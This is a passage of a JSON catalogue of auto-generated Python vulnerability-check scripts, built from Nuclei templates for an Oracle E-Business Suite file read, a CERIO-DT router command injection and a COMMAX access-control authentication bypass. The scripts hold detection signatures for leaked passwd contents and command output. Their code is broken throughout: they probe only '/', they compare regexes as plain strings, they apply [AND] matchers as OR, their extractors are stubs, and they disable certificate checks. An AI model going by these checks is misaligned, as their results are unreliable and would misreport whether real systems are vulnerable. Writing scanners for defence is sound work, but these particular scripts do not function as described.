        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: oracle-ebs-bispgrapgh-file-read\nName: Oracle eBusiness Suite - Improper File Access\nSeverity: critical\nDescription: Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_oracle_ebs_bispgrapgh_file_read:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"oracle-ebs-bispgrapgh-file-read\"\n    SEVERITY = \"critical\"\n    NAME = \"Oracle eBusiness Suite - Improper File Access\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] regex ['root:.*:0:0:']\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Oracle eBusiness Suite - Improper File Access\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_oracle_ebs_bispgrapgh_file_read(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: oracle-ebs-bispgrapgh-file-read\nName: Oracle eBusiness Suite - Improper File Access\nSeverity: critical\nDescription: Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_oracle_ebs_bispgrapgh_file_read:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"oracle-ebs-bispgrapgh-file-read\"\n    SEVERITY = \"critical\"\n    NAME = \"Oracle eBusiness Suite - Improper File Access\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] regex ['root:.*:0:0:']\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Oracle eBusiness Suite - Improper File Access\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_oracle_ebs_bispgrapgh_file_read(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "oracle",
          "lfi",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_cerio_dt_rce",
        "name": "CERIO-DT Interface - Command Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "CERIO DT series routers have an operation command injection vulnerability in specific versions. An attacker could exploit this vulnerability to execute commands.",
        "severity": "critical",
        "detection": "[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: cerio-dt-rce\nName: CERIO-DT Interface - Command Execution\nSeverity: critical\nDescription: CERIO DT series routers have an operation command injection vulnerability in specific versions. An attacker could exploit this vulnerability to execute commands.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_cerio_dt_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"cerio-dt-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"CERIO-DT Interface - Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"CERIO-DT Interface - Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_cerio_dt_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: cerio-dt-rce\nName: CERIO-DT Interface - Command Execution\nSeverity: critical\nDescription: CERIO DT series routers have an operation command injection vulnerability in specific versions. An attacker could exploit this vulnerability to execute commands.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_cerio_dt_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"cerio-dt-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"CERIO-DT Interface - Command Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"CERIO-DT Interface - Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_cerio_dt_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cerio",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_commax_biometric_auth_bypass",
        "name": "COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass",
        "language": "Python",
        "famille": "WebApp",
        "description": "COMMAX Biometric Access Control System 1.0.0 suffers from an authentication bypass vulnerability. An unauthenticated attacker through cookie poisoning can bypass authentication and disclose sensitive information and circumvent physical controls in smart homes and buildings.",
        "severity": "critical",
        "detection": "[AND] mot(s) '<title>::: COMMAX :::</title>' | mot(s) 'text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: commax-biometric-auth-bypass\nName: COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass\nSeverity: critical\nDescription: COMMAX Biometric Access Control System 1.0.0 suffers from an authentication bypass vulnerability. An unauthenticated attacker through cookie poisoning can bypass authentication and disclose sensitive information and circumvent physical controls in smart homes and buildings.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_commax_biometric_auth_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"commax-biometric-auth-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<title>::: COMMAX :::</title>' | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<title>::: COMMAX :::</title>', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_commax_biometric_auth_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: commax-biometric-auth-bypass\nName: COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass\nSeverity: critical\nDescription: COMMAX Biometric Access Control System 1.0.0 suffers from an authentication bypass vulnerability. An unauthenticated attacker through cookie poisoning can bypass authentication and disclose sensitive information and circumvent physical controls in smart homes and buildings.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_commax_biometric_auth_bypass:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"commax-biometric-auth-bypass\"\n    SEVERITY = \"critical\"\n    NAME = \"COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection 